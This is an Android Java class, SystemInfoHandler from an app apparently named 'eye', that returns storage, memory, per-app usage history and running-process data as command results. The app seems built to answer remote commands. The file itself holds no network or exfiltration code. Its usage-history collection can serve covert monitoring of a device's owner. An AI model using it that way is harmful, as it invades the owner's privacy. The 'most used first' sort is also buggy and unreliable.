package com.idsiber.eye.handlers;

import android.app.ActivityManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.text.format.Formatter;
import android.util.Log;

import com.idsiber.eye.CommandResult;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.SortedMap;
import java.util.TreeMap;

/**
 * Handler untuk informasi sistem seperti storage, memory, usage stats, dll
 */
public class SystemInfoHandler {
    private static final String TAG = "SystemInfoHandler";
    private Context context;

    public SystemInfoHandler(Context context) {
        this.context = context;
    }

    public CommandResult getStorageInfo() {
        try {
            JSONObject storageInfo = new JSONObject();

            // Internal storage
            File internalStorage = Environment.getDataDirectory();
            StatFs internalStat = new StatFs(internalStorage.getPath());
            
            long internalTotal = internalStat.getTotalBytes();
            long internalAvailable = internalStat.getAvailableBytes();
            long internalUsed = internalTotal - internalAvailable;

            JSONObject internalInfo = new JSONObject();
            internalInfo.put("total_bytes", internalTotal);
            internalInfo.put("available_bytes", internalAvailable);
            internalInfo.put("used_bytes", internalUsed);
            internalInfo.put("total_readable", Formatter.formatFileSize(context, internalTotal));
            internalInfo.put("available_readable", Formatter.formatFileSize(context, internalAvailable));
            internalInfo.put("used_readable", Formatter.formatFileSize(context, internalUsed));
            internalInfo.put("usage_percentage", (int)((internalUsed * 100) / internalTotal));

            storageInfo.put("internal_storage", internalInfo);

            // External storage (if available)
            if (Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) {
                File externalStorage = Environment.getExternalStorageDirectory();
                StatFs externalStat = new StatFs(externalStorage.getPath());
                
                long externalTotal = externalStat.getTotalBytes();
                long externalAvailable = externalStat.getAvailableBytes();
                long externalUsed = externalTotal - externalAvailable;

                JSONObject externalInfo = new JSONObject();
                externalInfo.put("total_bytes", externalTotal);
                externalInfo.put("available_bytes", externalAvailable);
                externalInfo.put("used_bytes", externalUsed);
                externalInfo.put("total_readable", Formatter.formatFileSize(context, externalTotal));
                externalInfo.put("available_readable", Formatter.formatFileSize(context, externalAvailable));
                externalInfo.put("used_readable", Formatter.formatFileSize(context, externalUsed));
                externalInfo.put("usage_percentage", (int)((externalUsed * 100) / externalTotal));

                storageInfo.put("external_storage", externalInfo);
            } else {
                storageInfo.put("external_storage", "Not available");
            }

            return new CommandResult(true, "Storage info retrieved", storageInfo.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get storage info: " + e.getMessage(), null);
        }
    }

    public CommandResult getMemoryInfo() {
        try {
            JSONObject memoryInfo = new JSONObject();
            
            // App memory info
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (activityManager != null) {
                ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
                activityManager.getMemoryInfo(memInfo);

                JSONObject appMemory = new JSONObject();
                appMemory.put("available_memory", memInfo.availMem);
                appMemory.put("total_memory", memInfo.totalMem);
                appMemory.put("used_memory", memInfo.totalMem - memInfo.availMem);
                appMemory.put("available_readable", Formatter.formatFileSize(context, memInfo.availMem));
                appMemory.put("total_readable", Formatter.formatFileSize(context, memInfo.totalMem));
                appMemory.put("used_readable", Formatter.formatFileSize(context, memInfo.totalMem - memInfo.availMem));
                appMemory.put("low_memory", memInfo.lowMemory);
                appMemory.put("threshold", memInfo.threshold);
                appMemory.put("usage_percentage", (int)(((memInfo.totalMem - memInfo.availMem) * 100) / memInfo.totalMem));

                memoryInfo.put("system_memory", appMemory);
            }

            // Process memory info
            Runtime runtime = Runtime.getRuntime();
            JSONObject processMemory = new JSONObject();
            processMemory.put("max_memory", runtime.maxMemory());
            processMemory.put("total_memory", runtime.totalMemory());
            processMemory.put("free_memory", runtime.freeMemory());
            processMemory.put("used_memory", runtime.totalMemory() - runtime.freeMemory());
            processMemory.put("max_readable", Formatter.formatFileSize(context, runtime.maxMemory()));
            processMemory.put("total_readable", Formatter.formatFileSize(context, runtime.totalMemory()));
            processMemory.put("free_readable", Formatter.formatFileSize(context, runtime.freeMemory()));
            processMemory.put("used_readable", Formatter.formatFileSize(context, runtime.totalMemory() - runtime.freeMemory()));

            memoryInfo.put("app_memory", processMemory);

            return new CommandResult(true, "Memory info retrieved", memoryInfo.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get memory info: " + e.getMessage(), null);
        }
    }

    public CommandResult getUsageStats(JSONObject params) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                return new CommandResult(false, "Usage stats require Android 5.0+", null);
            }

            UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            if (usageStatsManager == null) {
                return new CommandResult(false, "Usage stats manager not available", null);
            }

            // Get time range (default: last 24 hours)
            int days = params.optInt("days", 1);
            Calendar calendar = Calendar.getInstance();
            long endTime = calendar.getTimeInMillis();
            calendar.add(Calendar.DAY_OF_YEAR, -days);
            long startTime = calendar.getTimeInMillis();

            List<UsageStats> usageStatsList = usageStatsManager.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, startTime, endTime);

            if (usageStatsList.isEmpty()) {
                return new CommandResult(false, "No usage stats available. Please grant usage access permission.", null);
            }

            // Sort by total time in foreground
            SortedMap<Long, UsageStats> sortedStats = new TreeMap<>();
            for (UsageStats usageStats : usageStatsList) {
                if (usageStats.getTotalTimeInForeground() > 0) {
                    sortedStats.put(usageStats.getTotalTimeInForeground(), usageStats);
                }
            }

            JSONArray usageArray = new JSONArray();
            long totalUsageTime = 0;
            int maxApps = params.optInt("max_apps", 20);
            int count = 0;

            // Iterate in reverse order (most used first)
            for (Map.Entry<Long, UsageStats> entry : sortedStats.entrySet()) {
                if (count >= maxApps) break;
                
                UsageStats stats = entry.getValue();
                JSONObject appUsage = new JSONObject();
                
                try {
                    String appName = context.getPackageManager().getApplicationLabel(
                        context.getPackageManager().getApplicationInfo(stats.getPackageName(), 0)).toString();
                    appUsage.put("app_name", appName);
                } catch (Exception e) {
                    appUsage.put("app_name", stats.getPackageName());
                }
                
                appUsage.put("package_name", stats.getPackageName());
                appUsage.put("total_time_foreground", stats.getTotalTimeInForeground());
                appUsage.put("total_time_readable", formatDuration(stats.getTotalTimeInForeground()));
                appUsage.put("last_time_used", stats.getLastTimeUsed());
                appUsage.put("last_time_used_readable", new Date(stats.getLastTimeUsed()).toString());
                appUsage.put("first_time_stamp", stats.getFirstTimeStamp());
                
                usageArray.put(appUsage);
                totalUsageTime += stats.getTotalTimeInForeground();
                count++;
            }

            JSONObject result = new JSONObject();
            result.put("usage_stats", usageArray);
            result.put("total_apps", count);
            result.put("total_usage_time", totalUsageTime);
            result.put("total_usage_time_readable", formatDuration(totalUsageTime));
            result.put("period_days", days);
            result.put("start_time", startTime);
            result.put("end_time", endTime);

            return new CommandResult(true, "Usage stats retrieved for " + count + " apps", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get usage stats: " + e.getMessage(), null);
        }
    }

    public CommandResult getRunningProcesses() {
        try {
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (activityManager == null) {
                return new CommandResult(false, "ActivityManager not available", null);
            }

            List<ActivityManager.RunningAppProcessInfo> runningApps = activityManager.getRunningAppProcesses();
            
            JSONArray processArray = new JSONArray();
            
            if (runningApps != null) {
                for (ActivityManager.RunningAppProcessInfo processInfo : runningApps) {
                    JSONObject processObj = new JSONObject();
                    processObj.put("process_name", processInfo.processName);
                    processObj.put("pid", processInfo.pid);
                    processObj.put("uid", processInfo.uid);
                    processObj.put("importance", getImportanceString(processInfo.importance));
                    processObj.put("importance_value", processInfo.importance);
                    
                    // Package names in this process
                    JSONArray packageArray = new JSONArray();
                    for (String pkg : processInfo.pkgList) {
                        packageArray.put(pkg);
                    }
                    processObj.put("packages", packageArray);
                    
                    processArray.put(processObj);
                }
            }

            JSONObject result = new JSONObject();
            result.put("running_processes", processArray);
            result.put("total_processes", processArray.length());

            return new CommandResult(true, "Found " + processArray.length() + " running processes", result.toString());
        } catch (Exception e) {
            return new CommandResult(false, "Failed to get running processes: " + e.getMessage(), null);
        }
    }

    private String formatDuration(long milliseconds) {
        long seconds = milliseconds / 1000;
        long minutes = seconds / 60;
        long hours = minutes / 60;
        long days = hours / 24;
        
        if (days > 0) {
            return String.format(Locale.getDefault(), "%dd %dh %dm %ds", 
                days, hours % 24, minutes % 60, seconds % 60);
        } else if (hours > 0) {
            return String.format(Locale.getDefault(), "%dh %dm %ds", 
                hours, minutes % 60, seconds % 60);
        } else if (minutes > 0) {
            return String.format(Locale.getDefault(), "%dm %ds", 
                minutes, seconds % 60);
        } else {
            return String.format(Locale.getDefault(), "%ds", seconds);
        }
    }

    private String getImportanceString(int importance) {
        switch (importance) {
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND:
                return "Foreground";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND_SERVICE:
                return "Foreground Service";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_TOP_SLEEPING:
                return "Top Sleeping";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE:
                return "Visible";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_PERCEPTIBLE:
                return "Perceptible";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_CANT_SAVE_STATE:
                return "Can't Save State";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE:
                return "Service";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_CACHED:
                return "Cached";
            case ActivityManager.RunningAppProcessInfo.IMPORTANCE_GONE:
                return "Gone";
            default:
                return "Unknown (" + importance + ")";
        }
    }
}
